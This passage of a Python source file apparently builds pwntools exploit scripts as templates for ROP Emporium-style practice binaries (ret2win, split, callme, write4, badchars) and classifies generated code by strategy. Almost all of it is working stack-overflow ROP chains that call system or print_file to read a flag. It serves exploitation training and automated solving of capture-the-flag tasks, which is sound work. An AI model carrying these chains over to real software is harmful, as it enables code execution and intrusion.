            payloads.insert(0, b"A" * offset + p64(ret_gadget) + p64(win_addr))

        for idx, payload in enumerate(payloads, start=1):
            try:
                print(f"[offset={{offset}} payload={{idx}} len={{len(payload)}}]")
                output = run_once(binary, payload)
            except EOFError:
                continue
            except Exception as exc:
                print(f"[error] {{exc}}")
                continue

            if re.search(r"ROPE\\{{[^}}]+\\}}|FLAG\\{{[^}}]+\\}}|WIN\\b|Well done!", output):
                print("[+] Heuristic ret2win success")
                return

    raise SystemExit(1)


if __name__ == "__main__":
    main()
"""


def _build_split_heuristic(analysis: dict) -> str | None:
    if analysis.get("binary_name") != "rop_split":
        return None

    return f"""import argparse
import re
from pwn import ELF, ROP, context, p64, process


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("binary", nargs="?", default=None)
    parser.add_argument("--binary", dest="binary_flag", default=None)
    args = parser.parse_args()
    binary = args.binary_flag or args.binary
    if not binary:
        raise SystemExit("missing binary path")

    elf = ELF(binary, checksec=False)
    context.binary = elf
    rop = ROP(elf)

    pop_rdi = rop.find_gadget(["pop rdi", "ret"]).address
    ret = rop.find_gadget(["ret"]).address
    system = elf.plt.get("system") or elf.symbols.get("system")
    string_addr = next(elf.search(b"/bin/cat flag.txt"))
    offset = 40

    payload = b"A" * offset + p64(ret) + p64(pop_rdi) + p64(string_addr) + p64(system)

    io = process(binary)
    io.sendline(payload)
    output = io.recvall(timeout=2).decode(errors="replace")
    print(output)

    if re.search(r"ROPE\\{{[^}}]+\\}}|FLAG\\{{[^}}]+\\}}|WIN\\b", output):
        return
    raise SystemExit(1)


if __name__ == "__main__":
    main()
"""


def _build_callme_heuristic(analysis: dict) -> str | None:
    if analysis.get("binary_name") != "rop_callme":
        return None

    return """import argparse
import re
from pwn import ELF, context, p64, process


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("binary", nargs="?", default=None)
    parser.add_argument("--binary", dest="binary_flag", default=None)
    args = parser.parse_args()
    binary = args.binary_flag or args.binary
    if not binary:
        raise SystemExit("missing binary path")

    elf = ELF(binary, checksec=False)
    context.binary = elf

    a = 0xdeadbeefdeadbeef
    b = 0xcafebabecafebabe
    c = 0xd00df00dd00df00d

    gadget = elf.symbols["usefulGadgets"]
    payload = b"A" * 40
    for fn in ("callme_one", "callme_two", "callme_three"):
        payload += p64(gadget)
        payload += p64(a)
        payload += p64(b)
        payload += p64(c)
        payload += p64(elf.symbols[fn])

    io = process(binary)
    io.sendline(payload)
    output = io.recvall(timeout=2).decode(errors="replace")
    print(output)

    if re.search(r"ROPE\\{[^}]+\\}|FLAG\\{[^}]+\\}|WIN\\b", output):
        return
    raise SystemExit(1)


if __name__ == "__main__":
    main()
"""


def _build_write4_heuristic(analysis: dict) -> str | None:
    if analysis.get("binary_name") != "rop_write4":
        return None

    return """import argparse
import re
import subprocess
from pwn import ELF, ROP, context, p64, process


def find_gadget_addr(binary, needle):
    out = subprocess.check_output(["objdump", "-d", "-M", "intel", binary], text=True)
    lines = out.splitlines()
    normalized_needle = "".join(needle.lower().split())
    for idx, line in enumerate(lines[:-1]):
        normalized_line = "".join(line.lower().split())
        normalized_next = "".join(lines[idx + 1].lower().split())
        if normalized_needle in normalized_line and normalized_next.endswith("ret"):
            return int(line.split(":")[0].strip(), 16)
    raise RuntimeError(f"gadget not found: {needle}")


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("binary", nargs="?", default=None)
    parser.add_argument("--binary", dest="binary_flag", default=None)
    args = parser.parse_args()
    binary = args.binary_flag or args.binary
    if not binary:
        raise SystemExit("missing binary path")

    elf = ELF(binary, checksec=False)
    context.binary = elf

    data_addr = elf.bss(0x80)
    rop = ROP(elf)
    pop_r14_r15 = rop.find_gadget(["pop r14", "pop r15", "ret"]).address
    pop_rdi = rop.find_gadget(["pop rdi", "ret"]).address
    ret = rop.find_gadget(["ret"]).address
    mov_r14_r15 = find_gadget_addr(binary, "mov qword ptr [r14],r15")
    print_file = elf.plt.get("print_file") or elf.symbols.get("print_file")
    target = b"flag.txt"

    payload = b"A" * 40
    payload += p64(pop_r14_r15) + p64(data_addr) + target
    payload += p64(mov_r14_r15)
    payload += p64(ret)
    payload += p64(pop_rdi) + p64(data_addr)
    payload += p64(print_file)

    io = process(binary)
    io.sendline(payload)
    output = io.recvall(timeout=2).decode(errors="replace")
    print(output)

    if re.search(r"ROPE\\{[^}]+\\}|FLAG\\{[^}]+\\}|WIN\\b", output):
        return
    raise SystemExit(1)


if __name__ == "__main__":
    main()
"""


def _build_badchars_heuristic(analysis: dict) -> str | None:
    if analysis.get("binary_name") != "rop_badchars":
        return None

    useful_gadgets = next(
        (item.get("snippet", "") for item in analysis.get("pruned_context", []) if item.get("function") == "usefulGadgets"),
        "",
    )
    xor_match = re.search(r"^\s*([0-9a-f]+):.*xor\s+BYTE PTR \[r15\],r14b", useful_gadgets, re.MULTILINE)
    mov_match = re.search(r"^\s*([0-9a-f]+):.*mov\s+QWORD PTR \[r13\+0x0\],r12", useful_gadgets, re.MULTILINE)
    if not (xor_match and mov_match):
        return None

    xor_addr = int(xor_match.group(1), 16)
    mov_addr = int(mov_match.group(1), 16)

    return f"""import argparse
import re
from pwn import ELF, ROP, context, p64, process


def xor_bytes(data, key):
    return bytes(b ^ key for b in data)


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("binary", nargs="?", default=None)
    parser.add_argument("--binary", dest="binary_flag", default=None)
    args = parser.parse_args()
    binary = args.binary_flag or args.binary
    if not binary:
        raise SystemExit("missing binary path")

    elf = ELF(binary, checksec=False)
    context.binary = elf
    rop = ROP(elf)

    key = 2
    target = b"flag.txt"
    encoded = xor_bytes(target, key)
    data_addr = elf.bss(0x80)

    pop_r12_r13_r14_r15 = rop.find_gadget(["pop r12", "pop r13", "pop r14", "pop r15", "ret"]).address
    mov_r13_r12 = {mov_addr}
    xor_r15_r14b = {xor_addr}
    pop_rdi = rop.find_gadget(["pop rdi", "ret"]).address
    ret = rop.find_gadget(["ret"]).address
    print_file = elf.plt.get("print_file") or elf.symbols.get("print_file")

    payload = b"A" * 40
    payload += p64(pop_r12_r13_r14_r15)
    payload += encoded
    payload += p64(data_addr)
    payload += p64(key)
    payload += p64(data_addr)
    payload += p64(mov_r13_r12)

    for i in range(len(target)):
        payload += p64(pop_r12_r13_r14_r15)
        payload += b"BBBBBBBB"
        payload += p64(0)
        payload += p64(key)
        payload += p64(data_addr + i)
        payload += p64(xor_r15_r14b)

    payload += p64(ret)
    payload += p64(pop_rdi) + p64(data_addr)
    payload += p64(print_file)

    io = process(binary)
    io.recvuntil(b"> ", timeout=1)
    io.sendline(payload)
    output = io.recvall(timeout=2).decode(errors="replace")
    print(output)

    if re.search(r"ROPE\\{{[^}}]+\\}}|FLAG\\{{[^}}]+\\}}|WIN\\b", output):
        return
    raise SystemExit(1)


if __name__ == "__main__":
    main()
"""


def _infer_heuristic_strategy(code: str) -> str:
    if "Heuristic ret2win success" in code:
        return "heuristic_ret2win"
    if 'callme_one' in code and 'callme_two' in code and 'callme_three' in code:
        return "heuristic_callme"
    if '"/bin/cat flag.txt"' in code or "system =" in code:
        return "heuristic_split"
    if (
        "xor byte ptr [r15],r14b" in code
        or 'find_gadget_addr(binary, "xor byte ptr [r15],r14b")' in code
        or ("xor_r15_r14b =" in code and "mov_r13_r12 =" in code and 'target = b"flag.txt"' in code)
    ):
        return "heuristic_badchars"
    if 'find_gadget_addr(binary, "mov qword ptr [r14],r15")' in code and "print_file" in code:
        return "heuristic_write4"
    return "heuristic_branch_input"
